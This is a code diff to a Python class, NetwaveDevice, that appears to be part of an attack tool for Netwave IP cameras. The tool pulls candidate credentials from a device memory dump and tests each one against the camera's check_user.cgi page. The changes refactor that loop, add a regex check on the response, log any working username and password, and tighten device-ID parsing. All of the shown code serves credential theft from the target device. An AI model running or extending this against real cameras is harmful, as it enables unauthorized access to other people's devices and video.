@@ -79,11 +79,7 @@ class NetwaveDevice:
     def __init__(self, host: str, port: int) -> None:
         self._host = host
         self._port = port
-
-        self._session = aiohttp.ClientSession(
-            connector=aiohttp.TCPConnector(limit=8192),
-            timeout=aiohttp.ClientTimeout(30),
-        )
+        self._session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(30))
 
     def __str__(self) -> str:
         return f"{self._host}:{self._port}"
@@ -241,12 +237,12 @@ class NetwaveDevice:
         self, possible_credentials: List[DeviceCredentials]
     ) -> Optional[DeviceCredentials]:
         """
-        Get the valid credentials from the list of possible credentials.
+        Get the valid credentials from a list of possible credentials.
 
         Parameters
         ----------
         credentials : List[DeviceCredentials]
-            A list of possible credentials for the Netwave IP camera.
+            The list of possible credentials for the Netwave IP camera.
 
         Returns
         -------
@@ -255,22 +251,24 @@ class NetwaveDevice:
             Returns None if no valid credentials were found.
         """
         for credentials in possible_credentials:
-            if await self._check_credentials(credentials):
-                if credentials.password is None:
-                    logger.info(
-                        "[%s] Found valid credentials: %s",
-                        self,
-                        credentials.username,
-                    )
-                else:
-                    logger.info(
-                        "[%s] Found valid credentials: %s:%s",
-                        self,
-                        credentials.username,
-                        credentials.password,
-                    )
+            if not await self._check_credentials(credentials):
+                continue
 
-                return credentials
+            if credentials.password is None:
+                logger.info(
+                    "[%s] Found valid credentials: %s",
+                    self,
+                    credentials.username,
+                )
+            else:
+                logger.info(
+                    "[%s] Found valid credentials: %s:%s",
+                    self,
+                    credentials.username,
+                    credentials.password,
+                )
+
+            return credentials
 
         logger.error("[%s] Could not find valid credentials in memory dump", self)
         return None
@@ -301,10 +299,18 @@ class NetwaveDevice:
         async with self._session.get(
             f"http://{self}/check_user.cgi", auth=auth
         ) as response:
-            if response.status == 200:
-                return True
+            if response.status != 200:
+                return False
 
+            try:
+                text = await response.text()
+            except UnicodeDecodeError:
+                return False
+
+        if re.match(r"var user='.+';\n?var pwd='.*';\n?var pri=\d;", text) is None:
             return False
+
+        return True
 
     @property
     def host(self) -> str:
@@ -341,7 +347,7 @@ class NetwaveDevice:
                 return None
 
         for line in text.splitlines():
-            device_id_match = re.match(r"var id=[\"'](\w+)[\"'];", line)
+            device_id_match = re.match(r"var id='([0-9A-F]{12})';", line)
 
             if device_id_match is None:
                 continue
@@ -407,7 +413,7 @@ class NetwaveDevice:
                 self._get_valid_credentials(possible_credentials),
                 timeout=remaining_time,
             )
-        except TimeoutError:
+        except (TimeoutError, asyncio.CancelledError):
             logger.error("[%s] Could not get valid credentials", self)
             return None
 
